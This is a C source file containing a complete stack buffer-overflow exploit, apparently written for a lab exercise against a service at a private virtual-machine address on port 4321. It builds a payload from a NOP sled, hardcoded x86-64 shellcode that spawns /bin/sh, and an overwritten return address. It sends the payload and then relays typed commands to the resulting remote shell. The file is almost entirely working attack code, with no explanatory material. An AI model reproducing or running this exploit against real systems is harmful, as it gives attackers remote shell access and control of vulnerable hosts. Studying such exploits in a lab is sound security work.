#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>


int debug = 1;
int sockfd;

int build_msg(u_int8_t *buf);

int main(int argc, char* argv[]) {

	u_int8_t buf_non_pointer[256];
	u_int8_t *buf = buf_non_pointer;
	build_msg(buf); //Modify the buffer


	//Our socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (debug) printf("Socket created\n");

	//Configure the destination
	char dest_ip_adress[] = "192.168.56.103";
	struct sockaddr_in dest;
	memset(&dest,0,sizeof(dest));
	dest.sin_family = AF_INET;
	dest.sin_port = htons(4321);
	inet_pton(AF_INET, dest_ip_adress, &(dest.sin_addr));

	//Connect to dest
	connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr_in));
	if (debug) printf("Socket connected to destination\n");

	//Wait to receive the question
	char recveive_buf[500];
	memset(recveive_buf, 0, 500);
	int receive_length = recv(sockfd, recveive_buf, 500, 0); //receive in bytes
	if (debug) {
		printf("Message received : %s\n", recveive_buf);
	};
	if (receive_length == -1) printf("ERROR : RECEIVE");

	//Send the buffer to launch a shell
	send(sockfd, buf_non_pointer, 256, 0);
	if (debug) printf("Message sent\n");

	char terminal_command[200];
	while (1) {
		memset(terminal_command, 0, 200);
		fgets(terminal_command, 200, stdin);
		send(sockfd, terminal_command, 256, 0);
	};


	return 0;

};


int build_msg(u_int8_t *buf) {

	memset(buf, 0x90, 256); //Fill all with the no-op instruction

	u_int8_t shell_code[27] =   { 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05 };
	int shell_code_size = 27;
	long ret_addr = 0x7fffffffe5f0; //buf address given by the program

	memcpy(buf, shell_code, shell_code_size ); //Copy the shellcode at the beginning of buf
	memcpy(buf + 140, &ret_addr , 6);
	*(buf + 146) = 0x00;

	return 0;
};
